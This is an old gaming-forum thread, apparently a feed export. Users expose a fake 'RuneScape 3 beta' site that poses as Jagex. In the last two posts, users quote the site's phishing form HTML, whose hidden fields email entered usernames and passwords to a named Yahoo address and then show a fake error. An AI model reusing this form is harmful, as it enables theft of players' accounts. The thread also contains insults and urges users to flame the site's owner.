channel.title: Look here... what a retard
channel.description:
http://runescapebeta1.tripod.com/id8.html
this guy claims to be from jagex and has made Rs3 which is complete bullshit i tried logging on it said server is full or ur pass is wrong so i made a lvl 3 acc and still my pass was wrong then at 2 o clock i tried , so i found out he was accualy bullshitting (i thought it was worth a try) so then i go to picture gallery and he makes these fake pics and claims its the 'new' full dragon lol he says his e-mail is jagexadmin@runescape.com i sent him a message if he replys ill post here and u guys can spam/flame him all u want

item.title: Look here... what a retard
item.dc:creator: @The_Un-Named The Un-Named
item.description:
@The_Un-Named wrote:

The dude is probally off a game.

But the last(go here) was released on the runescape page in the ask the gods question about a year ago.

Read full topic

o man check this out im now a gold crown dont believe me?

MOD IO9 BITCHES~!

item.title: Look here... what a retard
item.dc:creator: @whothe0 the fu superior
item.description:
@whothe0 wrote:

[quote=“irfan786, post:6, topic:17489”]“You may use your Runescape 2 account from www.runescape.com”
Direct Translation:
Use you runescape account info on my fake login screen so I can get your password and steal your account and its goodys.

Lol those “Full Dragon” pics are from a crappy pc game, I forgot its name, wil lget back to you on that. The picture under the drag pics is from Runescape.com’s download section. N’ the picture that says runescape, he just screenied it from runescape.com and it now hosting it under his site. Total scam. [br][size=1]Posted at: October 08, 2006, 06:29:38 PM[/size][hr][quote author=the fu superior link=topic=26259.msg298727#msg298727 date=1160367431]
this guy claims to be from jagex and has made Rs3 which is complete bullshit i tried logging on it said server is full or ur pass is wrong so i made a lvl 3 acc and still my pass was wrong
[/quote]
Sorry to tell you but the account you used to login and your lev 3 are going to be hacked.[/quote]

i know this thats y i said to flame him! btw i only used a lvl 3 (made in like 2 seconds)

Read full topic

item.title: Look here... what a retard
item.dc:creator: @leader leader
item.description:
@leader wrote:

[quote=“Rictoo, post:7, topic:17489”][code]


<INPUT TYPE=“HIDDEN” NAME=“tlx_OKMessage” VALUE="Either your password or username is incorrect or the server is currently
down please try again later!

Thankyou,
Jagex LTD.
">
[/code]

It just sends your Username and Pass to JoshuaPLewis@yahoo.com -.-[/quote]

Nice find.

Read full topic

item.title: Look here... what a retard
item.dc:creator: @Rictoo Rictoo
item.description:
@Rictoo wrote:

<form action="http://svcs.tripod.lycos.com/svcs/formproc.jsp" method="post"> <INPUT TYPE="HIDDEN" NAME="tlx_EmailTo" VALUE="JoshuaPLewis@yahoo.com"> <INPUT TYPE="HIDDEN" NAME="tlx_Subject" VALUE="Runescape"> <INPUT TYPE="HIDDEN" NAME="tlx_SendMode" VALUE="1"> <INPUT TYPE="HIDDEN" NAME="tlx_OKMessage" VALUE= "Either your password or username is incorrect or the server is currently down please try again later! Thankyou, Jagex LTD."> <INPUT TYPE="HIDDEN" NAME="tlx_SortOrder" VALUE="Username, Password, Level">

It just sends your Username and Pass to JoshuaPLewis@yahoo.com -.-
